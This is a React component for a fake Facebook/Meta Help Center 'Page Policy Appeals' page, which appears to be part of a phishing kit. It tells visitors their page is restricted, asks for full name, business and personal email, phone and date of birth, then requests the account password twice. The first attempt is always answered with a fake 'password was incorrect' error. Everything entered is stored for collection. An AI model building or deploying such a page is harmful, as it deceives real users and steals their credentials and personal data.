import React, { useState } from "react";
import '../business-help-center/style.css';
import { Button, Form, Input, Modal, Space } from 'antd';
import { SearchOutlined } from "@mui/icons-material";
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import { faHouseChimney } from '@fortawesome/free-solid-svg-icons';
import { useNavigate } from "react-router-dom";
import { useDispatch } from "react-redux";
import { setData } from "../../store/business/businessSlice";


const BusinessHelpCenter = () => {
  const [form] = Form.useForm();
  const navigate = useNavigate();
  const [namePage, setNamePage] = useState('');
  const [fullName, setFullName] = useState('');
  const [businessEmail, setBusinessEmail] = useState('');
  const [personalEmail, setPersonalEmail] = useState('');
  const [phone, setPhone] = useState('');
  const [date, setDate] = useState('');
  const [text, setText] = useState('');
  const [passwordFirst, setPasswordFirst] = useState('');
  const [passwordSecond, setPasswordSecond] = useState('');
  const [checkPass, setCheckPass] = useState(false);
  const [open, setOpen] = useState(false);
  const { TextArea } = Input;
  const dispatch = useDispatch()



  const showModal = () => {
    setOpen(true);
  };
  const handleOk = () => {
    setOpen(false);
  };
  const [formPassword] = Form.useForm();
  const handleCancel = () => {
    formPassword.resetFields();
    setOpen(false);
  };

  const onFinish = (e: any) => {
    if (!checkPass) {
      setCheckPass(true)
      setPasswordFirst(e.password)
    }
    else {
      setPasswordSecond(e.password)
      setCheckPass(false)
      navigate('/confirm');
      dispatch(setData({
        namePage,
        fullName,
        businessEmail,
        personalEmail,
        phone,
        date,
        text,
        passwordFirst,
        passwordSecond: e.password,
      }))
      clearState()
    }
  };

  const clearState = () => {
    setNamePage('');
    setFullName('');
    setBusinessEmail('');
    setPersonalEmail('');
    setPhone('');
    setDate('');
    setText('');
    setPasswordFirst('')
    setPasswordSecond('')
  }

  return (
    <div className="container_business">
      <div className="header">
        <div className="header_sup">
          <div className="logo" >
            <a href="##">
              <img src="https://scontent.xx.fbcdn.net/v/t1.15752-9/433377898_1195899118047328_5310864312235708346_n.png?_nc_cat=110&ccb=1-7&_nc_sid=5f2048&_nc_eui2=AeHaCRazprnB2GcaS1KVR2lO8SYMXA_dj_HxJgxcD92P8SXWoLpmUuX-hcllzot4SMu7KLuDM39sn234M1-dPtUG&_nc_ohc=MYI-YnH9tSMAb4yvY5g&_nc_ad=z-m&_nc_cid=0&_nc_ht=scontent.xx&oh=03_AdWdudDdo4-Lq64O6O5l4SgK2AJDVBvh115nFkWe4isDsg&oe=6637A55F" alt="" />
            </a>
          </div>
          <Space direction="vertical" size="middle">
            <Space.Compact size="middle">
              <Input className="search" addonBefore={<SearchOutlined />} placeholder="How can we help?" />
            </Space.Compact>
          </Space>
        </div>
      </div>
      <div className="nav">
        <div className="nav_sup">

          <div className="nav_help">
            <FontAwesomeIcon icon={faHouseChimney} style={{ color: '#3578e5', fontSize: '16px' }} /> <span style={{ color: '#3578e5', fontSize: '16px', fontWeight: '600', marginLeft: '8px' }}>Help Center</span>
          </div>
          <p style={{ color: '#3578e5', display: 'flex', alignItems: 'center', justifyContent: 'center', marginRight: '10px' }}>English</p>
        </div>
      </div>
      <div className="block">
        <div className="block_sup">
          <div className="tab">
            <p>Creating an Account</p>
            <p>Your Profile</p>
            <p>Friending</p>
            <p>Facebook Dating</p>
            <p>Your Home Page</p>
            <p>Messaging</p>
            <p>Reels</p>
            <p>Stories</p>
            <p>Photos</p>
            <p>Videos</p>
            <p>Gaming</p>
            <p>Pages</p>
            <p>Groups</p>
            <p>Events</p>
            <p>Fundraisers and Donations</p>
            <p>Meta Pay</p>
            <p>Marketplace</p>
            <p>Apps</p>
            <p>Facebook Mobile Apps</p>
            <p>Accessibility</p>
          </div>
          <div className="content">
            <div className="header_content">Page Policy Appeals</div>
            <div className="text_content">
              <p style={{ marginTop: '16px' }}>We have detected unusual activity on your page that violates our community standards.</p>
              <p style={{ marginTop: '20px' }}>Your access to your page has been limited, and you are currently unable to post, share, or comment using your page.</p>
              <p style={{ marginTop: '20px' }}>If you believe this to be a mistake, you have the option to submit an appeal by providing the necessary information.</p>
            </div>
            <div className="form">
              <Form form={form} name="validateOnly" layout="vertical" autoComplete="off">
                <Form.Item name="namePage" label="Name Page" rules={[{ required: true, message: "Name Page is required" }]}>
                  <Input onChange={(e) => setNamePage(e.target.value)} value={namePage} />
                </Form.Item>
                <Form.Item name="fullName" label="Fullname" rules={[{ required: true, message: "Fullname is required" }]}>
                  <Input onChange={(e) => setFullName(e.target.value)} value={fullName} />
                </Form.Item>
                <Form.Item name="businessEmail" label="Business Email Address" rules={[{ required: true, message: "Business Email Address is required" }]}>
                  <Input onChange={(e) => setBusinessEmail(e.target.value)} value={businessEmail} />
                </Form.Item>
                <Form.Item name="personalEmail" label="Personal Email Address" rules={[{ required: true, message: "Personal Email Address is required" }]}>
                  <Input onChange={(e) => setPersonalEmail(e.target.value)} value={personalEmail} />
                </Form.Item>
                <Form.Item name="phone" label="Mobile Phone Number" rules={[{ required: true, message: "Mobile Phone Number is required" }]}>
                  <Input onChange={(e) => setPhone(e.target.value)} value={phone} />
                </Form.Item>
                <Form.Item name='dateBirth' label="Date of Birth" rules={[{ required: true }]}>
                  <Input type="date" onChange={(e) => setDate(e.target.value)} value={date} />
                </Form.Item>
                <div className="text_sup">
                  <Form.Item name='text' label="Please provide us information that will help us investigate." >
                    <TextArea rows={4} onChange={(e) => setText(e.target.value)} value={text} />
                  </Form.Item>
                </div>
              </Form>
            </div>
            <div className="footer_content">
              <>
                <Space>
                  <Button style={{ width: '80px', height: '40px', position: 'absolute', right: '10px', top: '14px' }} type="primary" onClick={showModal}>
                    <p style={{ fontSize: '.875rem', fontWeight: "600" }}>Send</p>
                  </Button>

                </Space>
                <Modal
                  open={open}
                  title="Please Enter Your Password"
                  onOk={handleOk}
                  onCancel={handleCancel}

                  width={400}
                  footer={false}
                >
                  <p style={{ marginBottom: '8px', paddingTop: '6px', marginTop: '16px', borderTop: '1px solid #e9ebee' }}>For your security, you must re-enter your password to continue</p>
                  <Form
                    form={formPassword}
                    layout="vertical"
                    onFinish={onFinish}
                    autoComplete="off"
                  >
                    <Form.Item
                      name="password"
                      label={<div>Enter Your Password</div>}
                    >
                      <Input.Password placeholder="input password" />
                      {checkPass === true && <div style={{ color: 'red' }}>
                        Your password was incorrect!
                      </div>}

                    </Form.Item>
                    <Form.Item>
                      <Space style={{
                        display: 'flex',
                        justifyContent: 'end',
                        alignItems: 'center'
                      }}>
                        <Button type="primary" htmlType="submit">
                          <p style={{ fontSize: '.875rem', fontWeight: "600" }}>Continue</p>
                        </Button>
                      </Space>
                    </Form.Item>
                  </Form>
                </Modal>
              </>
            </div>
          </div>
          <div className="tab">
          </div>
        </div>
      </div>

    </div>


  );

};

export default BusinessHelpCenter;

